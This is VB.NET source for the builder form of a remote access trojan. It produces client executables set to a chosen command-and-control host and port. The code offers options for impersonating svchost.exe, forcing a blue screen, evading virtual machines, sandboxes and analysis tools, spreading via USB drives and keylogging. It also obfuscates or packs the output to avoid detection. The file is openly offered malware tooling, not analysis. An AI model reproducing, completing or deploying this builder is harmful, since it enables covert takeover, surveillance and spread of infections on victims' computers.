Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Public Class Builder
    Inherits Form
    ' Methods
    Private string_0 As String
    Public Sub New()
        Me.string_0 = Nothing
        Me.InitializeComponent()
    End Sub

    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles Me.Load
        CKUpx.Visible = False 'DISABLED
        Me.Icon = My.Resources.icon
        Me.dir.SelectedIndex = 0
        Me.host.Text = Class6.smethod_2("host", Me.host.Text)
        Me.port.Value = Conversions.ToDecimal(Class6.smethod_2("p", Conversions.ToString(Me.port.Value)))
        Me.exe.Text = Class6.smethod_2("exe", Me.exe.Text)
        Me.dir.SelectedIndex = Conversions.ToInteger(Class6.smethod_2("dir", Conversions.ToString(Me.dir.SelectedIndex)))
        Me.VN.Text = Class6.smethod_2("vn", Me.VN.Text)
        Me.bsod.Checked = Conversions.ToBoolean(Class6.smethod_2("bsod", Me.bsod.Checked.ToString))
        Me.Idr.Checked = Conversions.ToBoolean(Class6.smethod_2("Idr", Me.Idr.Checked.ToString))
        Me.Isu.Checked = Conversions.ToBoolean(Class6.smethod_2("Isu", Me.Isu.Checked.ToString))
        Me.Isf.Checked = Conversions.ToBoolean(Class6.smethod_2("Isf", Me.Isf.Checked.ToString))
        Me.USB_SP.Checked = Conversions.ToBoolean(Class6.smethod_2("USB_SP", Me.USB_SP.Checked.ToString))
        Me.klen.Value = Conversions.ToDecimal(Class6.smethod_2("klen", Me.klen.Value.ToString))
        Me.Anti_CH.Checked = Conversions.ToBoolean(Class6.smethod_2("Anti_CH", Me.Anti_CH.Checked.ToString))

        Me.string_0 = Class6.smethod_2("ico", String.Empty)
        If Not File.Exists(Me.string_0) Then
            Me.string_0 = String.Empty
        End If
        If (Convert.ToDouble(Me.port.Value) <> Conversions.ToDouble(Class6.smethod_2("port", Conversions.ToString(Me.port.Value)))) Then
            Me.port.Value = Conversions.ToDecimal(Class6.smethod_2("port", Conversions.ToString(Me.port.Value)))
        End If
        Try
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.string_0 = String.Empty
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        Dim dialog As New SaveFileDialog With {
              .Filter = "EXE|*.exe",
              .FileName = "Client.exe"
          }
        If (dialog.ShowDialog = DialogResult.OK) Then

            If File.Exists(dialog.FileName) Then
                File.Delete(dialog.FileName)
            End If
            Dim contents As String = File.ReadAllText((Application.StartupPath & "\Stub\Stub.il"))
            Dim newValue As String = Class6.smethod_4(String.Concat(New String() {Me.VN.Text, Me.host.Text, Conversions.ToString(Me.port.Value), Me.exe.Text, Me.dir.Text, Me.bsod.Checked.ToString, Me.Idr.Checked.ToString, Me.Isu.Checked.ToString, Me.Isf.Checked.ToString, Me.USB_SP.Checked.ToString, Me.Anti_CH.Checked.ToString}))
            Dim box As TextBox = Me.VN
            Dim text As String = box.Text
            box.Text = [text]
            contents = contents.Replace("[VN]", Class6.smethod_14([text])).Replace("[H]", Me.host.Text).Replace("[P]", Conversions.ToString(Me.port.Value)).Replace("[EXE]", Me.exe.Text).Replace("[DR]", Me.dir.Text.Replace("%", String.Empty)).Replace("[BD]", Me.bsod.Checked.ToString).Replace("[RG]", newValue).Replace("[Idr]", Me.Idr.Checked.ToString).Replace("[Isu]", Me.Isu.Checked.ToString).Replace("[Isf]", Me.Isf.Checked.ToString).Replace("[USB_SP]", Me.USB_SP.Checked.ToString).Replace("[klen]", Me.klen.Value.ToString).Replace("[Anti_CH]", Me.Anti_CH.Checked.ToString)
            File.WriteAllText((Interaction.Environ("temp") & "\stub.il"), contents)
            Dim startInfo As New ProcessStartInfo With {
                .FileName = (Interaction.Environ("windir") & "\Microsoft.NET\Framework\v2.0.50727\ilasm.exe"),
                .CreateNoWindow = True,
                .WindowStyle = ProcessWindowStyle.Hidden,
                .Arguments = String.Concat(New String() {"/alignment=512 /QUIET """, Interaction.Environ("temp"), "\stub.il"" /output:""", dialog.FileName, """"})
            }
            Process.Start(startInfo).WaitForExit()
            If ((Not Me.string_0 Is Nothing) AndAlso File.Exists(Me.string_0)) Then
                IconN.InjectIcon(dialog.FileName, Me.string_0)
            End If
            Dim ptr As IntPtr = GClass2.BeginUpdateResource(dialog.FileName, False)
            Dim buffer As Byte() = File.ReadAllBytes((Application.StartupPath & "\Stub\Stub.manifest"))
            GClass2.UpdateResource(ptr, CType(24, IntPtr), CType(1, IntPtr), 0, buffer, buffer.Length)
            GClass2.EndUpdateResource(ptr, False)
            Class6.smethod_3("host", Me.host.Text)
            Class6.smethod_3("p", Conversions.ToString(Me.port.Value))
            Class6.smethod_3("exe", Me.exe.Text)
            Class6.smethod_3("dir", Conversions.ToString(Me.dir.SelectedIndex))
            Class6.smethod_3("vn", Me.VN.Text)
            Class6.smethod_3("bsod", Me.bsod.Checked.ToString)
            Class6.smethod_3("ico", Me.string_0)
            Class6.smethod_3("Idr", Me.Idr.Checked.ToString)
            Class6.smethod_3("Isu", Me.Isu.Checked.ToString)
            Class6.smethod_3("Isf", Me.Isf.Checked.ToString)
            Class6.smethod_3("USB_SP", Me.USB_SP.Checked.ToString)
            Class6.smethod_3("klen", Me.klen.Value.ToString)
            Class6.smethod_3("Anti_CH", Me.Anti_CH.Checked.ToString)
            Me.Close()
            Threading.Thread.Sleep(100)


            If Me.CKOBF.Checked Then
                Application.DoEvents()
                '  If Not Directory.Exists((Application.StartupPath & "\Tools")) Then
                '     Directory.CreateDirectory((Application.StartupPath & "\Tools"))
                'End If
                '    Threading.Thread.Sleep(50)
                '   If Not File.Exists((Application.StartupPath & "\Tools\dotNET_Reactor.exe")) Then
                Dim dotNET_Reactor As Byte() = My.Resources.dotNET_Reactor
                File.WriteAllBytes((Application.StartupPath & "\dotNET_Reactor.exe"), dotNET_Reactor)
                Interaction.Shell(("cmd.exe /C dotNET_Reactor.exe -file """ & dialog.FileName & """ -admin 0 -shownagscreen 0 -showloadingscreen 0 -targetfile """ & dialog.FileName & """ -antitamp 1 -compression 1 -control_flow_obfuscation 1  -flow_level 9 -nativeexe 0 -necrobit 1 -necrobit_comp 1 -prejit 0 -incremental_obfuscation 1 -obfuscate_public_types 1 -resourceencryption 1 -stringencryption 1 -antistrong 1"), AppWinStyle.NormalFocus, True, -1)
                Threading.Thread.Sleep(100)
                Me.Close()
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\dotNET_Reactor.exe")
            End If


            If Me.CKUpx.Checked Then
                Application.DoEvents()
                '  If Not Directory.Exists((Application.StartupPath & "\Tools")) Then
                '   Directory.CreateDirectory((Application.StartupPath & "\Tools"))
                'End If
                '    Threading.Thread.Sleep(50)
                ' If Not File.Exists((Application.StartupPath & "\Tools\mpress.exe")) Then
                Dim mpress As Byte() = My.Resources.mpress
                File.WriteAllBytes((Application.StartupPath & "\mpress.exe"), mpress)
                Interaction.Shell(("cmd.exe /C mpress.exe -s """ & dialog.FileName & """"), AppWinStyle.NormalFocus, True, -1)
                Threading.Thread.Sleep(100)
                Me.Close()
                My.Computer.FileSystem.DeleteFile(Application.StartupPath & "\mpress.exe")
            End If
            MessageBox.Show("Stub created successfully.", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information)

        End If

    End Sub



    Private Sub Idr_CheckedChanged(sender As Object, e As EventArgs) Handles Idr.CheckedChanged
        If Not Me.Idr.Checked Then
            If (Me.exe.Text = String.Empty) Then
                Me.exe.Text = "svchost.exe"
            End If
            Me.exe.Enabled = False
            Me.dir.Enabled = False
        Else
            Me.exe.Enabled = True
            Me.dir.Enabled = True
        End If
    End Sub

    '########################
    '#  Anti-VM+Obfuscation #
    '#   Spread USB+Mpress  #
    '#  Humoud Al-Juraid    #
    '#      @HumoudMJ       #
    '# Please Donot remove  #
    '#	    my credit       #
    '########################


    Private Sub Anti_CH_CheckedChanged(sender As Object, e As EventArgs) Handles Anti_CH.CheckedChanged
        Dim toolTip1 As New ToolTip()

        toolTip1.SetToolTip(Me.Anti_CH, "Vmware|Virtualbox|Sandboxie|Wireshark|ApateDNS|AndSomeDisassemblersApps")
    End Sub

    Private Sub USB_SP_CheckedChanged(sender As Object, e As EventArgs) Handles USB_SP.CheckedChanged
        Dim toolTip2 As New ToolTip()


        toolTip2.SetToolTip(Me.USB_SP, "It will copy your Clinet.exe on any usb attached to PC")

    End Sub

    Private Sub CKOBF_CheckedChanged(sender As Object, e As EventArgs) Handles CKOBF.CheckedChanged
        Dim toolTip3 As New ToolTip()

        toolTip3.SetToolTip(Me.CKOBF, "A very simple obfuscation, DON'T use it if you want to use some crypter")
    End Sub


End Class